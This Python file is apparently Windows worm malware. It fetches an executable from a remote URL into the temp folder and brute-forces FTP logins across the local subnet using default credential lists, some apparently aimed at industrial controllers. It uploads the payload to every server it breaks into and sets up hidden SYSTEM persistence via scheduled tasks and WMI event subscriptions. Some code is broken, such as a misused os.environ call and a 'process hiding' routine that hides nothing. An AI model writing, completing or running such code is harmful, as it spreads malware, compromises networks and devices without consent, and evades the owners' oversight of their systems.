import os
import winreg
import sys
import random
import string
import psutil
import subprocess
import socket
import threading
import sys
import requests
import urllib3
import ftplib
import wmi
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

GITHUB_URL = "https://raw.githubusercontent.com/<user>/<repo>/main/init.exe"
PAYLOAD_PATH = None

def generate_random_name(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def download_payload():
    global PAYLOAD_PATH
    try:
        random_name = f'{generate_random_name()}.exe'
        destination_path = os.path.join(os.environ('TEMP'), random_name)
        response = requests.get(GITHUB_URL)
        if response.status_code == 200:
            with open(destination_path, 'wb') as f:
                f.write(response.content)
            PAYLOAD_PATH = destination_path
        return destination_path
    except:
        return None

# FTP propagation to subnet servers
def ftp_spread():
    try:
        local_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0]
        common_users = [
            'test',
            'abc123',
            'nic2212',
            'PlcmSpIp',
            'accounting',
            '123456',
            'nmt',
            'se',
            'supervisor',
            'Root',
            'MayGion',
            'USER',
            'admin',
            'manager',
            'mysql',
            'password',
            'user',
            'uploader',
            'support',
            'beijer',
            'fdrusers',
            'qwerty',
            'john',
            'nobody',
            'administrator',
            'default',
            'instrument',
            'device',
            'httpadmin',
            'none',
            'ftpuser',
            'pr',
            'anonymous',
            'post',
            'Guest',
            'marketing',
            'mail',
            'hr',
            'User',
            'IEIeMerge',
            'sysdiag',
            'webserver',
            'localadmin',
            'ftp',
            'QNUDECPU',
            'qbf77101',
            'webmaster',
            'apc',
            'ADMIN',
            'dmftp',
            'sa',
            'Admin',
            'postmaster',
            'dm',
            'oracle',
            '111111',
            'adtec',
            'a',
            'root',
            'user1',
            'loader',
            'su',
            'MELSEC',
            'ntpupdate',
            'ftp_boot',
            'pcfactory',
            'sales',
            'www-data',
            'wsupgrade',
            'avery',
        ]
        common_pass = [
            'USER',
            'admin',
            'Janitza',
            'eqidemo',
            'spam',
            'anonymous',
            'supervisor',
            'factorycast@schneider',
            'user00',
            'password',
            '12hrs37',
            '123456',
            'beijer',
            'maygion.com',
            'webadmin',
            'b1uRR3',
            'test2',
            'webmaster',
            'eMerge',
            'pass1',
            'test',
            'test123',
            'nobody',
            'test1',
            'root',
            'news',
            'info',
            'ftp',
            'ntpupdate',
            'webpages',
            'sresurdf',
            'uploader',
            'pcfactory',
            'ZYPCOM',
            'apc',
            'admin12345',
            'mysql',
            'system',
            'none',
            '1111',
            'ftp_boot',
            'MELSEC',
            'guest',
            'nas',
            'hexakisoctahedron',
            'techsupport',
            'localadmin',
            'default',
            'wsupgrade',
            'stingray',
            'dpstelecom',
            'fwdownload',
            'abc123',
            'web',
            'testingpw',
            'ko2003wa',
            'oracle',
            'cvsadm',
            '1234',
            'testing',
            'test4',
            'wago',
            'test3',
            'tester',
            '12345',
            'avery',
            'instrument',
            'user',
            'testuser',
            'fhttpadmin',
            'QNUDECPU',
            '9999',
            'rootpasswd',
            'PlcmSpIp',
            'poiuypoiuy',
            'sysadm'
        ]
        done = False
        for i in range(1, 255):
            ip = f'{local_ip}.{i}'
            for user in common_users:
                if done: break
                done = False
                for pwd in common_pass:
                    try:
                        ftp = ftplib.FTP(ip, timeout=1)
                        ftp.login(user, pwd)
                        random_name = f'{generate_random_name()}.exe'
                        if os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
                        else: payload_path = download_payload()
                        if payload_path:
                            with open(payload_path, 'rb') as f:
                                ftp.storbinary(f'STOR {random_name}', f)
                        ftp.quit()
                        done = True
                        break 
                    except:
                        continue
    except:
        pass

# Hide process by mimicking cmd.exe
def hide_process():
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() == 'cmd.exe':
                os.environ['COMSPEC'] = proc.exe()
                break
    except:
        pass

# Persistence via schtasks
def persist_schtasks():
    try:
        task_name = generate_random_name()
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        cmd = f'schtasks /create /tn "{task_name}" /tr "\"{exe_path}\"" /sc onstart /ru SYSTEM /rl HIGHEST /f'
        subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=0x08000000)  # Hide window
    except:
        pass

# Persistence via process creation trigger
def persist_process_trigger():
    try:
        connection = wmi.WMI()
        event_filter = connection.__EventFilter(
            Name=generate_random_name(),
            Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
        )
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        consumer = connection.Win32_CommandLineEventConsumer(
            Name=generate_random_name(),
            CommandLineTemplate=f'"{exe_path}"'
        )
        connection.__FilterToConsumerBinding(
            Filter=f"__EventFilter.Name='{event_filter.Name}'",
            Consumer=f"Win32_CommandLineEventConsumer.Name='{consumer.Name}'"
        )
    except:
        pass

if __name__ == "__main__":
    hide_process()
    download_payload()
    persist_schtasks()
    persist_process_trigger()
    ftp_spread()